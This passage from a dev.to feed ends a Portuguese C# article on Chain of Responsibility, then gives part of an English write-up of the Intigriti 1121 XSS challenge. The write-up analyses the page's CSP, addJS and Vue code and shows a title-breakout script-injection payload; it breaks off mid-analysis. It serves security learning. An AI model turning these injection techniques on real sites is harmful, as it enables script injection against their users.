&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;WithdrawalProcessor&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;readonly&lt;/span&gt; &lt;span class="n"&gt;IHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;_handler&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;WithdrawalProcessor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
        &lt;span class="n"&gt;_handler&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt; &lt;span class="nf"&gt;Withdraw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
        &lt;span class="n"&gt;_handler&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Muito mais simples. Não? Não há mais uma sequência potencialmente infinita de condicionais, as dependências agora são injetadas em cada &lt;em&gt;handler&lt;/em&gt;, deixando nosso processador de requisições mais leve e limpo, e o código foi bastante enxugado, tornando sua compreensão e manutenção mais simples.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclus%C3%A3o"&gt;
  &lt;/a&gt;
  Conclusão
&lt;/h2&gt;

&lt;p&gt;O Chain of Responsibility torna muito mais simples lidar com situações que demandam múltiplas condicionais, e que podem, ou não, resumir o fluxo de uma dada requisição ou comando. É um acessório muito útil e que pode ser usado em diversas situações, desde validações a execução de procedimentos.&lt;/p&gt;

&lt;p&gt;Gostou? Me deixe saber pelos comentários ou por minhas redes sociais.&lt;/p&gt;

&lt;p&gt;Muito obrigado pela leitura, e até a próxima!&lt;/p&gt;

</description>
      <category>csharp</category>
      <category>dotnet</category>
      <category>programming</category>
      <category>braziliandevs</category>
    </item>
    <item>
      <title>Intigriti 1121 - XSS Challenge Writeup</title>
      <author>Breno Vitório</author>
      <pubDate>Sun, 21 Nov 2021 23:48:40 +0000</pubDate>
      <link>https://dev.to/therealbrenu/intigriti-1121-xss-challenge-writeup-23mj</link>
      <guid>https://dev.to/therealbrenu/intigriti-1121-xss-challenge-writeup-23mj</guid>
      <description>&lt;p&gt;Another month, another amazing XSS Challenge from &lt;a href="https://twitter.com/intigriti"&gt;Intigriti&lt;/a&gt;, made by &lt;a href="https://twitter.com/IvarsVids"&gt;Ivars Vids&lt;/a&gt;. My first solution for this was not the intended one, but I hope you guys somehow appreciate it. 🤗&lt;/p&gt;

&lt;p&gt;In the end of the writeup, I am going to be presenting you the intended solution, which I just figured out with a few hours of challenge remaining.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#detective-indepth-analysis"&gt;
  &lt;/a&gt;
  🕵️ In-Depth Analysis
&lt;/h2&gt;

&lt;p&gt;When we access the page &lt;a href="https://challenge-1121.intigriti.io/challenge/index.php"&gt;https://challenge-1121.intigriti.io/challenge/index.php&lt;/a&gt;, it's possible to see that there is a list of security issues, as known as the 2021 edition of OWASP TOP 10. There is also a search bar from where it's possible to look for specific vulnerabilities. Whatever we type into this input will appear with the &lt;code&gt;s&lt;/code&gt; query parameter when submitted.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1VB8n7ws--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b5967dpu0d6tw014sul6.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1VB8n7ws--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b5967dpu0d6tw014sul6.png" alt="Result of the search for 'Hello Guys'" width="838" height="235"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If we try to submit, for example, a &lt;code&gt;s&lt;/code&gt; value like &lt;code&gt;&amp;lt;h1&amp;gt;example&amp;lt;/h1&amp;gt;&lt;/code&gt;, we will get this text being present on two different parts of the page:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;You searched for '&lt;span class="ni"&gt;&amp;amp;lt;&lt;/span&gt;h1&lt;span class="ni"&gt;&amp;amp;gt;&lt;/span&gt;test&lt;span class="ni"&gt;&amp;amp;lt;&lt;/span&gt;/h1&lt;span class="ni"&gt;&amp;amp;gt;&lt;/span&gt;'&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt; // First one
      ...
  &lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"app"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
          ...
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;You searched for &lt;span class="ni"&gt;&amp;amp;lt;&lt;/span&gt;h1&lt;span class="ni"&gt;&amp;amp;gt;&lt;/span&gt;test&lt;span class="ni"&gt;&amp;amp;lt;&lt;/span&gt;/h1&lt;span class="ni"&gt;&amp;amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;         // Second one
          ...
      &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It's worth mentioning two points:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The second part where our &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; appears, that one inside the &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; tag, actually comes to our browser as &lt;code&gt;&amp;lt;p&amp;gt;You searched for v-{{search}}&amp;lt;/p&amp;gt;&lt;/code&gt;, and we can verify this by opening the page source. So there is a client-side method for the use of templates happening here.&lt;/li&gt;
&lt;li&gt;The first part, which is that one inside the &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt; tag, is being escaped just like the second part, so our &lt;code&gt;&amp;lt;h1&amp;gt;example&amp;lt;/h1&amp;gt;&lt;/code&gt; is treated like a normal text instead of an HTML element. But there's a thing, the &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt; tag is not meant to have child elements and the browser will not parse as HTML something that simply goes inside this element. In view of this, we can close the tag and insert our &lt;code&gt;&amp;lt;h1&amp;gt;example&amp;lt;/h1&amp;gt;&lt;/code&gt; after it. 😄&lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;
  &lt;a href="#nationalpark-getting-to-know-the-scenario"&gt;
  &lt;/a&gt;
  🏞️ Getting to Know the Scenario
&lt;/h3&gt;

&lt;p&gt;By using our payload &lt;code&gt;&amp;lt;/title&amp;gt;&amp;lt;h1&amp;gt;example&amp;lt;/h1&amp;gt;&lt;/code&gt;, now our &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; tag goes to the page body and the browser treats it like a normal HTML element. So...what if we try to replace this &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; for something like a &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;? Well, if we try a payload like &lt;code&gt;&amp;lt;/title&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&lt;/code&gt;, it will actually be reflected to the page, but no alert is going to be popped out, and the reason can be found on the page response header:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;content-security-policy: base-uri 'self'; default-src 'self';&lt;br&gt;
script-src 'unsafe-eval' 'nonce-r4nd0mn0nc3' 'strict-dynamic';&lt;br&gt;
object-src 'none'; style-src 'sha256-dpZAgKnDDhzFfwKbmWwkl1IEwmNIKxUv+uw+QP89W3Q='&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There is a &lt;strong&gt;Content Security Policy&lt;/strong&gt; (CSP) defined, which is great because it will not trust in every single thing that pops into the page. For those who are not familiar, a CSP is a security standard that can be defined in order to tell to the environment (in this case, our browser) what should be  trusted and what should be restricted. The definition of a Content Security Policy helps to mitigate the risks of a XSS.&lt;/p&gt;

&lt;p&gt;By looking at what it has to tell us about scripts, we have:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;script-src 'unsafe-eval' 'nonce-r4nd0mn0nc3' 'strict-dynamic';&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I remember from the last XSS Challenge, by reading &lt;a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack%20In%20Bo%20-%20So%20we%20broke%20all%20CSPs...%20You%20won%27t%20guess%20what%20happened%20next%21.pdf"&gt;these slides&lt;/a&gt;, that when the &lt;code&gt;strict-dynamic&lt;/code&gt; policy is defined, we are able to execute JavaScript if its created by using &lt;code&gt;document.createElement("script")&lt;/code&gt;. It would be really terrible if this function was being used somewhe...what!?!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;addJS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;cb&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;script&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Script tag being created&lt;/span&gt;
  &lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;                              &lt;span class="c1"&gt;// Source being defined&lt;/span&gt;
  &lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;cb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;                            &lt;span class="c1"&gt;// Onload callback function being defined&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;sf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementsByTagName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;script&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="nx"&gt;sf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parentNode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;insertBefore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;sf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;        &lt;span class="c1"&gt;// Inserting it before the first script tag&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;So we have this function, which creates a script that's supposed to load external code, okay. But where is it used? Let's see:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;nonce=&lt;/span&gt;&lt;span class="s"&gt;"r4nd0mn0nc3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;delimiters&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;v-{{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;}}&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; &lt;span class="c1"&gt;// Apparently, delimiters for templates&lt;/span&gt;
  &lt;span class="nx"&gt;addJS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;./vuejs.php&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;initVUE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;   &lt;span class="c1"&gt;// addJS being called&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Our &lt;code&gt;addJS&lt;/code&gt; function is being called, the defined source is &lt;code&gt;./vuejs.php&lt;/code&gt; (???) and the onload callback function is &lt;code&gt;initVUE&lt;/code&gt; (???), which is defined down below. I promise it will all make sense in the end! 😅&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;initVUE&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Vue&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;initVUE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Vue&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;                         &lt;span class="c1"&gt;// new instance of Vue being created&lt;/span&gt;
    &lt;span class="na"&gt;el&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;#app&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;                     &lt;span class="c1"&gt;// All the magic will happen inside div#app&lt;/span&gt;
    &lt;span class="na"&gt;delimiters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;delimiters&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="c1"&gt;// Custom delimiters v-{{ }} being defined&lt;/span&gt;
    &lt;span class="na"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;owasp&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;
        &lt;span class="c1"&gt;// All the OWASP list inside here&lt;/span&gt;
      &lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;title&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt; - &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;description&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;includes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;searchParams&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;s&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt; &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}),&lt;/span&gt;
      &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;search&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;searchParams&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;s&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you are not familiar with &lt;a href="https://vuejs.org/v2/guide/"&gt;Vue.js&lt;/a&gt;, it's a very popular framework based on JavaScript, just like ReactJS or Angular, and it aims to simplify not only the experience of creating web Interfaces, but also anything that's being handled on the client-side.&lt;/p&gt;

&lt;p&gt;Also, Vue.js is actually the responsible for picking up that &lt;code&gt;v-{{search}}&lt;/code&gt; from the page source and converting it to the value of your &lt;code&gt;s&lt;/code&gt; query parameter. It does that by picking the &lt;code&gt;search&lt;/code&gt; value you can find in the &lt;code&gt;data&lt;/code&gt; object above. The original delimiters recognized by Vue.js are actually &lt;code&gt;{{ }}&lt;/code&gt;, but for this challenge, the delimiters are custom ones.&lt;/p&gt;

&lt;p&gt;That &lt;code&gt;./vuejs.php&lt;/code&gt; request is actually redirecting to a CDN hosted JavaScript file containing the basis of Vue.js, so it can be initialized on the &lt;code&gt;initVUE&lt;/code&gt; function.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#construction-html-injection-leads-to-csti"&gt;
  &lt;/a&gt;
  🚧 HTML Injection Leads to CSTI
&lt;/h3&gt;

&lt;p&gt;By assuming that the only way we can directly use JavaScript is calling &lt;code&gt;addJS&lt;/code&gt;, we have to find a different place from where it's being called. Here's the only place left:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;nonce=&lt;/span&gt;&lt;span class="s"&gt;"r4nd0mn0nc3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;isProd&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;        &lt;span class="c1"&gt;// isProd may not be true, hm...&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;searchParams&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;version&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;version&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;vueDevtools&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;searchParams&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;vueDevtools&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;vueDevtools&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;vueDevtools&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="se"&gt;[^&lt;/span&gt;&lt;span class="sr"&gt;0-9%a-z&lt;/span&gt;&lt;span class="se"&gt;/&lt;/span&gt;&lt;span class="sr"&gt;.&lt;/span&gt;&lt;span class="se"&gt;]&lt;/span&gt;&lt;span class="sr"&gt;/gi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/^&lt;/span&gt;&lt;span class="se"&gt;\/\/&lt;/span&gt;&lt;span class="sr"&gt;+/&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;999999999999&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
      &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;legacyLogger&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1000000000000&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
      &lt;span class="nx"&gt;addJS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;vueDevtools&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;initVUE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// addJS being called again!!!&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;performance&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
